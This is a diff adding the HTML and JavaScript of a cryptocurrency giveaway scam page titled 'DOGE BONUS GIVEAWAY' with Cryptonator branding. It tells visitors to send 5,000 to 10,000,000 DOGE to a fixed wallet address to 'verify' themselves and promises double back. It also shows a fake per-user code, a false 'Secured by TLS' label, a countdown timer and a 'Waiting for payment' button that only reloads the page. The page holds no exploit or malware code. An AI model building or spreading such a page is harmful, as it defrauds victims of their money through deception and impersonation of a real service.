@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>DOGE BONUS GIVEAWAY</title>
+      <meta name="author" content="Cryptonator.com" />
+      <link rel="shortcut icon" href="./new/favicon.png">
+      <!-- Fonts -->
+      <link href='https://fonts.googleapis.com/css?family=Lato:300,400,600,700' rel='stylesheet' type='text/css'>
+      <!-- End Fonts -->
+      <!-- CSS Files -->
+      <link rel="stylesheet" type="text/css" href="./new/bootstrap.min.css" />
+      <!-- End CSS Files -->
+      <!-- Scripts Section -->
+      <script src="./new/jquery-2.1.0.min.js?v20151219"></script>
+      <script src="./new/bootstrap.min.js?v20151219"></script>
+      <script src="./new/main.js?v5"></script>
+      <script src="./new/clipboard.min.js"></script>
+      <script>
+        if(!localStorage.getItem('dogeuid')) {
+           localStorage.setItem('dogeuid', Math.floor(Math.random()*90000) + 10000);
+        }
+      </script>
+      <!-- End Scripts Section -->
+   </head>
+   <body style="background-color:#FCFCFC;">
+      <div class="container">
+         <div class="row">
+            <div class="col-xs-12 col-sm-10 col-sm-offset-1 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3">
+               <div class="row">
+                  <div class="col-xs-6">
+                     <a class="btn btn-link disabled">
+                     <span class="glyphicon glyphicon-lock" aria-hidden="true"></span> Secured by TLS
+                     </a>
+                  </div>
+                  <div class="col-xs-6 text-right">
+                     <div class="dropdown pull-right">
+                        <a class="btn btn-link dropdown-toggle" id="language" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
+                        English
+                        <span class="caret"></span>
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="language">
+                           <li class="services"><a href="#" class="switchLanguageLnk" data-lang="en">English</a></li>
+                           <li class="services"><a href="#" class="switchLanguageLnk" data-lang="es">Español</a></li>
+                           <li class="services"><a href="#" class="switchLanguageLnk" data-lang="de">Deutsch</a></li>
+                           <li class="services"><a href="#" class="switchLanguageLnk" data-lang="fr">Français</a></li>
+                           <li class="services"><a href="#" class="switchLanguageLnk" data-lang="cn">&#20013;&#25991;</a></li>
+                           <li class="services"><a href="#" class="switchLanguageLnk" data-lang="ru">&#1056;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;</a></li>
+                        </ul>
+                     </div>
+                  </div>
+               </div>
+               <div class="panel panel-info">
+                  <div class="panel-body">
+                     <div class="pl-2"><img src="./new/BQwukuZwwwXrg27B9Le2Q6.png" alt="" srcset="" width="200"></div>
+                     <hr>
+                     <div >
+                        <div class="row">
+                           <div class="col-xs-12 col-sm-4">
+                              <img src="./new/chart3.png" class="img-responsive center-block" alt="QR-code">
+                           </div>
+                           <div class="col-xs-12 col-sm-8" style="padding-top:10px;">
+                              <p style="text-align:justify">You can scan this QR code with your mobile wallet app to make a payment.</p>
+                              <p style="text-align:justify">To verify your address, just send from <b>5 000</b> to <b>10 000 000</b> DOGE including the unique code that we have provided to the address below: <b style="word-break: break-word;">(x2 back)</b> <p><b>Unique Code: <font style="color:red"><script>document.write(localStorage.getItem('dogeuid'));</script></font><br/>Example: 5000.<font style="color:red"><script>document.write(localStorage.getItem('dogeuid'));</script></font> DOGE</b></p>  <b style="word-break: break-word;">DMb5tGLC9Muk5Q2btmoxQD6Fik6v2CQ7Z4</b></p>
+                              <div class="btn-group btn-group-justified" role="group" aria-label="...">
+                                 <div class="btn btn-default copy-to-clipboard" data-clipboard-text="DMb5tGLC9Muk5Q2btmoxQD6Fik6v2CQ7Z4" data-toggle="tooltip" data-trigger="manual" data-placement="bottom" title="Copied to clipboard"><span class="glyphicon glyphicon-copy" aria-hidden="true"></span> Copy address</div>
+                                 <a href="dogecoin:DMb5tGLC9Muk5Q2btmoxQD6Fik6v2CQ7Z4" class="btn btn-default"><span class="glyphicon glyphicon-export" aria-hidden="true"></span> Open in wallet</a>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     <hr>
+                     <p class="text-center"><a href="#" class="btn btn-lg btn-info" id="refresh-button"><img src="./new/loading.gif" alt="Loading..."> Waiting for payment</a></p>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <script>
+         var dateStop = 1799;
+         
+         function oneTick() {
+         	var seconds = 0,
+         		minutes = 0;
+         
+         	if (dateStop > 0) {
+         		seconds = dateStop % 60;
+         		minutes = (dateStop - seconds) / 60;
+         	}
+         
+         	$("#timer").text(minutes + ":" + (seconds < 10 ? "0" : "") + seconds);
+         
+         	dateStop--;
+         }
+         
+         oneTick();
+         
+         $(document).ready(function() {
+         	setInterval(oneTick, 1000);
+                      
+         	$("#refresh-button").click(function () {
+         		location.reload();
+         	});
+         
+         	// Copy to clipboard button and tooltip
+         	$('[data-toggle="tooltip"]').tooltip({
+         		container: 'body'
+         	});
+         
+         	var clipboard = new Clipboard('.copy-to-clipboard');
+         
+         	clipboard.on('success', function(e) {
+         	    $(e.trigger).tooltip('show');
+         	});
+         
+         	$('.copy-to-clipboard')
+         		.hover(
+         			function () {}, 
+         			function () {
+         				$(this).tooltip("hide");
+         			}
+         		);
+         
+         	
+                      $("#submit-button").click(function() {
+                          if ($("#wallet").val() != "") {
+                              $(this).html($(this).data("process"));
+         
+                              $("#form-wallet").append("<input type='hidden' name='hello' value='Я не бот' />");
+         
+                              $("#form-wallet").submit();
+                          }
+                      });
+         });
+      </script>
+   </body>
+</html>
